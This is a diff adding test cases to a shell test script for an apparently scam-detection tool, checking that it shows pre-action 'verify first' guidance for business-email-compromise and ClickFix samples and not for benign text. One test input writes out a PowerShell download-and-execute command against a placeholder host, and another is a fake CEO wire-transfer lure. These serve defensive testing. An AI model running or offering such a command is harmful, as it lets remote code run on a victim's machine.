@@ -2098,6 +2098,52 @@ assert "call" in d["exoneration"].lower() or "phone" in d["exoneration"].lower()
 ' && check "p30 json: BEC ALERT exoneration references call to verify" "0" "0" \
    || check "p30 json: BEC ALERT exoneration references call to verify" "0" "1"
 
+# ─── Perspective 31: text pre-action verify step ─────────────────────────────
+# BEC ISOLATE: shows ✓ Verify first: line with call guidance
+./hlse_core text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
+    | grep "Verify first:" \
+    | grep -qi "supposed sender\|already have" \
+    && check "p31: BEC shows Verify first: with call guidance" "0" "0" \
+    || check "p31: BEC shows Verify first: with call guidance" "0" "1"
+
+# ClickFix ISOLATE: shows Verify first: about never pasting commands
+./hlse_core text "Verify you are human: press Win+R and paste iex(iwr 'check.example.com/fix.ps1')" 2>/dev/null \
+    | grep "Verify first:" \
+    | grep -qi "never paste\|command" \
+    && check "p31: ClickFix shows Verify first: never-paste guidance" "0" "0" \
+    || check "p31: ClickFix shows Verify first: never-paste guidance" "0" "1"
+
+# LOG text (score < 60): no Verify first: line (score-gated)
+./hlse_core text "Your account needs verification. Please verify now." 2>/dev/null \
+    | grep -qv "Verify first:" \
+    && check "p31: LOG text has no Verify first line" "0" "0" \
+    || check "p31: LOG text has no Verify first line" "0" "1"
+
+# Safe text: no Verify first: line
+./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
+    | grep -qv "Verify first:" \
+    && check "p31: safe text has no Verify first line" "0" "0" \
+    || check "p31: safe text has no Verify first line" "0" "1"
+
+# JSON BEC: has "verify" field
+./hlse_core --json text "URGENT: CEO needs immediate wire transfer of 50000. Do not discuss with anyone." 2>/dev/null \
+    | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.read())
+assert "verify" in d, d
+assert "call" in d["verify"].lower() or "number" in d["verify"].lower(), d["verify"]
+' && check "p31 json: BEC has verify field" "0" "0" \
+   || check "p31 json: BEC has verify field" "0" "1"
+
+# JSON safe text: no "verify" field
+./hlse_core --json text "Meeting at 3pm tomorrow" 2>/dev/null \
+    | python3 -c '
+import sys, json
+d = json.loads(sys.stdin.read())
+assert "verify" not in d, d
+' && check "p31 json: safe text has no verify field" "0" "0" \
+   || check "p31 json: safe text has no verify field" "0" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
